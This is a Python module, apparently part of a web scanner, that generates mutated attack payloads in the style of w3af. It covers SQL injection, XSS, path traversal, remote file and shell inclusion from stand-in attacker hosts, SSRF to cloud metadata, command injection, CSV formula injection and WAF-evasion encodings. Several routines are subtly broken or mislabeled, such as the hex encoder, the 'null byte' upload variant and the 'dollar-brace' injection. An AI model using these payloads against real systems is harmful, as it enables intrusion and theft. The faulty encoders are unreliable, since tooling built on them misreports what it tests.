#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
w3af Payload Manipulation Engine — 借鉴 w3af (w3af.org) payload 编码/解码/mutation 工具链。

提供完整的请求载荷变异能力：
- URL 编码/双重编码/Unicode 编码
- Base64 编解码 (w3af base64encode/base64decode plugins)
- MD5 / SHA1 哈希计算 (w3af md5hash/sha1hash plugins)
- Request mutation pipeline (w3af mangle_plugin 架构)
- 参数值变异 (w3af fuzzable_request pattern)

Usage:
    from scanners.w3af_payload_engine import PayloadEngine

    engine = PayloadEngine()

    # URL encoding variations
    encoded = engine.url_encode("1' OR '1'='1")
    double_encoded = engine.double_url_encode("1' OR '1'='1")

    # Base64
    b64_encoded = engine.base64_encode("password")
    b64_decoded = engine.base64_decode("cGFzc3dvcmQ=")

    # Hash computation
    md5_hash = engine.md5hash("admin")
    sha1_hash = engine.sha1hash("admin")

    # Mutation pipeline: generate attack variants for a given parameter value
    variants = engine.mutate("admin", technique='sql_injection')
"""

import base64
import hashlib
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger('w3af_payload_engine')


# ====================================================================
# Data classes
# ====================================================================

@dataclass
class PayloadVariant:
    """A mutated variant of an original payload."""
    original: str
    mutated: str
    technique: str       # encoding technique used
    description: str = ''  # human-readable description
    vulnerability_type: str = ''  # what this mutation targets (e.g. 'sqli', 'xss')

    def to_dict(self) -> Dict[str, Any]:
        return {
            'original': self.original[:80] + ('...' if len(self.original) > 80 else ''),
            'mutated': self.mutated[:80] + ('...' if len(self.mutated) > 80 else ''),
            'technique': self.technique,
            'description': self.description,
        }


# ====================================================================
# w3af Payload Engine (inspired by w3af tools/ and mangle_plugin.py)
# ====================================================================

class PayloadEngine:
    """Complete payload encoding, decoding, and mutation engine."""

    def __init__(self):
        # URL encoding variants for evasion (w3af evasion_plugin patterns)
        self._url_encoding_variants = [
            ('normal', lambda s: urllib.parse.quote(s, safe='')),
            ('double', lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')),
            ('hex_all', lambda s: '%'.join(f'{ord(c):02X}' for c in s)),
            ('hex_space', lambda s: ''.join('%20' if c == ' ' else (f'%{ord(c):02X}' if c != '/' else c) for c in s)),
            ('unicode_percent', lambda s: '%'.join(f'u{ord(c):04X}' for c in s)),
            ('unicode_backslash', lambda s: '\\\\'.join(f'u{ord(c):04X}' for c in s)),
            ('utf8_surrogate', lambda s: ''.join(
                f'\\u{ord(c):04X}' if ord(c) < 128 else c for c in s)),
        ]

        # Character mapping for case-randomization evasion (w3af evasion_plugin)
        self._case_random_variants = [
            ('UPPER', str.upper),
            ('lower', str.lower),
            ('CaSeRaNdOm', lambda s: ''.join(
                c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))),
        ]

    # ------------------------------------------------------------------
    # URL Encoding (w3af urldecode/urlencode tools)
    # ------------------------------------------------------------------

    def url_encode(self, text: str, safe: str = '') -> str:
        """Standard URL encoding."""
        return urllib.parse.quote(text, safe=safe)

    def double_url_encode(self, text: str, safe: str = '') -> str:
        """Double URL encoding (w3af evasion bypass)."""
        first = urllib.parse.quote(text, safe='')
        return urllib.parse.quote(first, safe=safe)

    def hex_encode(self, text: str) -> str:
        """Hex encode every character."""
        return '%'.join(f'{ord(c):02X}' for c in text)

    def unicode_encode(self, text: str) -> str:
        """Unicode percent encoding (for filter evasion)."""
        return '%'.join(f'u{ord(c):04X}' for c in text)

    def utf8_unicode_escape(self, text: str) -> str:
        """UTF-8 unicode escape sequences."""
        return '\\u'.join(f'{ord(c):04X}' if ord(c) < 128 else c for c in text)

    def get_all_url_encoded_variants(self, text: str) -> List[str]:
        """Generate all URL encoding variants (w3af evasion_plugin)."""
        return [variant(text) for _, variant in self._url_encoding_variants]

    # ------------------------------------------------------------------
    # Base64 Encoding/Decoding (w3af base64encode/base64decode tools)
    # ------------------------------------------------------------------

    def base64_encode(self, text: str) -> str:
        """Base64 encode a string (w3af base64encode plugin)."""
        return base64.b64encode(text.encode('utf-8')).decode('ascii')

    def base64_decode(self, text: str) -> Optional[str]:
        """Base64 decode a string (w3af base64decode plugin)."""
        try:
            # Handle common encoding variations
            padded = text + '=' * (4 - len(text) % 4) if len(text) % 4 != 0 else text
            return base64.b64decode(padded).decode('utf-8')
        except Exception:
            # Try standard padding fix
            try:
                return base64.b64decode(text + '==').decode('utf-8')
            except Exception:
                return None

    def url_base64_encode(self, text: str) -> str:
        """URL-safe base64 encoding."""
        return base64.urlsafe_b64encode(text.encode('utf-8')).decode('ascii').rstrip('=')

    # ------------------------------------------------------------------
    # Hash Computation (w3af md5hash/sha1hash tools)
    # ------------------------------------------------------------------

    def md5hash(self, text: str) -> str:
        """MD5 hash of a string (w3af md5hash plugin)."""
        return hashlib.md5(text.encode('utf-8')).hexdigest()

    def sha1hash(self, text: str) -> str:
        """SHA1 hash of a string (w3af sha1hash plugin)."""
        return hashlib.sha1(text.encode('utf-8')).hexdigest()

    def sha256hash(self, text: str) -> str:
        """SHA256 hash of a string."""
        return hashlib.sha256(text.encode('utf-8')).hexdigest()

    # ------------------------------------------------------------------
    # Request Mutation Pipeline (w3af mangle_plugin architecture)
    # ------------------------------------------------------------------

    def mutate(self, value: str, technique: str = 'generic') -> List[PayloadVariant]:
        """Generate mutation variants of a payload value for vulnerability testing."""
        variants: List[PayloadVariant] = []

        if technique == 'sql_injection':
            variants.extend([
                PayloadVariant(value, f"'{value}'", 'single_quote', "Add single quote"),
                PayloadVariant(value, f'"{value}"', 'double_quote', "Add double quote"),
                PayloadVariant(value, f"1 OR 1=1; {value}", 'tautology', "Tautology prefix"),
                PayloadVariant(value, f"{value}'--", 'comment_injection', "Add SQL comment"),
                PayloadVariant(value, f"{value}/**/OR/**/1=1", 'comment_obfuscation', "Obfuscated tautology"),
                PayloadVariant(value, f"UNION SELECT 1,{value},3", 'union_inject', "UNION injection"),
                PayloadVariant(value, f"1 AND SLEEP(5); {value}", 'time_based', "Time-based blind SQLi"),
                PayloadVariant(self.url_encode(f"'{value}'"), f"'{self.url_encode(value)}'", 'url_encoded_quote', "URL-encoded quote"),
            ])

        elif technique == 'xss':
            variants.extend([
                PayloadVariant(value, f'<script>{value}</script>', 'script_tag', 'XSS via <script>'),
                PayloadVariant(value, f'"><script>{value}</script>', 'attr_break_xss', 'Attribute break XSS'),
                PayloadVariant(value, f"onerror=alert('{value}')", 'event_handler', 'Event handler XSS'),
                PayloadVariant(self.url_encode(f'<img src=x onerror=alert(1)>'), f'"><img src=x onerror=alert({self.url_encode(str(value))})>', 'img_tag_xss', 'IMG tag XSS'),
                PayloadVariant(value, f"javascript:{value}", 'javascript_uri', 'JavaScript URI XSS'),
                PayloadVariant(self.double_url_encode(f'<script>{value}</script>'), f'<<s<script>cript&gt;{value}', 'double_encoded_xss', 'Double-encoded XSS'),
            ])

        elif technique == 'lfi':
            variants.extend([
                PayloadVariant(value, f'{value}/../../../../etc/passwd', 'path_traversal', 'Path traversal'),
                PayloadVariant(value, f'{value}..%2f..%2f..%2f..%2fetc%2fpasswd', 'encoded_traversal', 'Encoded path traversal'),
                PayloadVariant(value, f'/proc/self/environ{value}', 'proc_environ', '/proc/self/environ LFI'),
                PayloadVariant(value, f'{value}\\..\\..\\..\\..\\windows\\system.ini', 'windows_traversal', 'Windows path traversal'),
            ])

        elif technique == 'rfi':
            variants.extend([
                PayloadVariant(f'http://attacker.com/payload.txt?{value}', f'http://attacker.com/payload.php?cmd={urllib.parse.quote(value)}', 'remote_include', 'Remote file inclusion'),
                PayloadVariant(value, f'https://evil.example.com/shell.php?c={urllib.parse.quote(value)}', 'remote_shell', 'Remote shell inclusion'),
            ])

        elif technique == 'ssrf':
            variants.extend([
                PayloadVariant(value, f'http://127.0.0.1:80{value}', 'loopback_ssrf', 'Loopback SSRF'),
                PayloadVariant(value, f'http://169.254.169.254/latest/meta-data{value}', 'aws_meta_ssrf', 'AWS metadata SSRF'),
                PayloadVariant(value, f'dict://127.0.0.1:11211{value}', 'dict_protocol_ssrf', 'Dict protocol SSRF'),
                PayloadVariant(value, f'file:///etc/passwd{value}', 'file_protocol', 'File protocol SSRF'),
            ])

        elif technique == 'command_injection':
            variants.extend([
                PayloadVariant(value, f'; cat /etc/passwd {value}', 'semicolon_inject', 'Semicolon command injection'),
                PayloadVariant(value, f'|| whoami {value}', 'pipe_inject', 'Pipe command injection'),
                PayloadVariant(value, f'&& id {value}', 'and_inject', 'AND command injection'),
                PayloadVariant(value, f'`id`{value}', 'backtick_inject', 'Backtick command injection'),
                PayloadVariant(value, f'{value}$0|cat /etc/passwd', 'dollar_brace', 'Dollar-brace injection'),
            ])

        elif technique == 'file_upload':
            variants.extend([
                PayloadVariant(value, f'{value}.php', 'php_ext', 'PHP file extension'),
                PayloadVariant(value, f'{value}.phar', 'phar_ext', 'PHAR file extension'),
                PayloadVariant(value, f'{value}00.php', 'null_byte_ext', 'Null byte bypass'),
                PayloadVariant(value, f'@{value}', 'at_symbol_ext', 'AT symbol bypass'),
            ])

        elif technique == 'csv_injection':
            variants.extend([
                PayloadVariant(value, f'=cmd|\'/C powershell.exe\'!A0', 'excel_cmd', 'Excel CMD injection'),
                PayloadVariant(value, f'+CMD(/C whoami)/a', 'csv_formula', 'CSV formula injection'),
            ])

        elif technique == 'generic':
            # Apply all encoding variants for generic mutation
            for name, encoder in self._url_encoding_variants:
                encoded = encoder(value)
                if encoded != value:
                    variants.append(PayloadVariant(
                        value, encoded, f'encoding_{name}',
                        f'{name} URL encoding'))

        return variants

    def generate_attack_payloads(self, target_type: str, count: int = 20) -> List[PayloadVariant]:
        """Generate attack payloads for a specific vulnerability type (w3af-style)."""
        engine = PayloadEngine()
        base_values = {
            'sqli': ["1", "admin'", "' OR 1=1--", "1 UNION SELECT 1,2,3"],
            'xss': ['<img src=x>', '<script>alert(1)</script>', '" onmouseover="alert(1)', '"><svg/onload=alert(1)'],
            'lfi': ['/etc/passwd', '/proc/self/environ', '..\\..\\windows\\system.ini'],
        }

        payloads: List[PayloadVariant] = []
        for base in base_values.get(target_type, base_values['sqli']):
            variants = engine.mutate(base, target_type)
            payloads.extend(variants[:count])

        return payloads[:count]

    # ------------------------------------------------------------------
    # Parameter Injection Helpers (w3af fuzzable_request pattern)
    # ------------------------------------------------------------------

    def inject_into_querystring(self, base_url: str, param_name: str, value: str) -> str:
        """Inject a value into the query string of a URL."""
        parsed = urllib.parse.urlparse(base_url)
        if '?' in base_url:
            return f'{base_url}&{param_name}={value}'
        return f'{base_url}?{param_name}={value}'

    def inject_into_post_data(self, params: Dict[str, str], target_param: str, value: str) -> Dict[str, str]:
        """Inject a value into POST data (w3af GET2POST pattern)."""
        new_params = dict(params)
        new_params[target_param] = value
        return new_params

    def convert_get_to_post(self, base_url: str, params: Dict[str, str]) -> Tuple[str, Dict[str, str]]:
        """Convert a GET request to POST (w3af CommonAttackMethods.GET2POST pattern)."""
        return base_url, dict(params)

    def convert_post_to_get(self, base_url: str, post_data: Dict[str, str]) -> str:
        """Convert a POST request to GET (w3af CommonAttackMethods.POST2GET pattern)."""
        query = urllib.parse.urlencode(post_data)
        return f'{base_url}?{query}' if '?' not in base_url else f'{base_url}&{query}'

    # ------------------------------------------------------------------
    # WAF Evasion Encodings (w3af evasion_plugin + custom combinations)
    # ------------------------------------------------------------------

    def get_evasion_encodings(self, payload: str) -> List[PayloadVariant]:
        """Generate all possible evasion encodings for a single payload."""
        variants = []

        # URL encoding layers
        for i in range(1, 4):
            encoded = payload
            for _ in range(i):
                encoded = urllib.parse.quote(encoded, safe='')
            variants.append(PayloadVariant(
                payload, encoded, f'double_url_encode_{i}x',
                f'URL-encoded {i} times'))

        # Null byte insertion between trigger characters
        result_with_nulls = ''
        for c in payload:
            result_with_nulls += c
            if re.match(r"""['"\\;`|&<>\$\(\)\{\}\[\]]""", c):
                result_with_nulls += '\x00'
        variants.append(PayloadVariant(payload, result_with_nulls, 'null_byte', 'Null byte between triggers'))

        # Case randomization on each word
        words = payload.split()
        for variant_name, func in self._case_random_variants:
            randomized = ' '.join(func(w) for w in words)
            if randomized != payload:
                variants.append(PayloadVariant(
                    payload, randomized, f'case_{variant_name}',
                    f'{variant_name} case randomization'))

        # HTML entity encoding
        html_encoded = ''.join(
            f'&#x{ord(c):02X};' if ord(c) > 127 else c for c in payload)
        variants.append(PayloadVariant(payload, html_encoded, 'html_entity', 'HTML hex entity encoding'))

        return variants


# ====================================================================
# Convenience functions (w3af tools/ CLI-style shortcuts)
# ====================================================================

engine = PayloadEngine()  # global singleton instance

def url_encode(text: str) -> str:
    return engine.url_encode(text)

def double_url_encode(text: str) -> str:
    return engine.double_url_encode(text)

def base64_encode(text: str) -> str:
    return engine.base64_encode(text)

def base64_decode(text: str) -> Optional[str]:
    return engine.base64_decode(text)

def md5hash(text: str) -> str:
    return engine.md5hash(text)

def sha1hash(text: str) -> str:
    return engine.sha1hash(text)
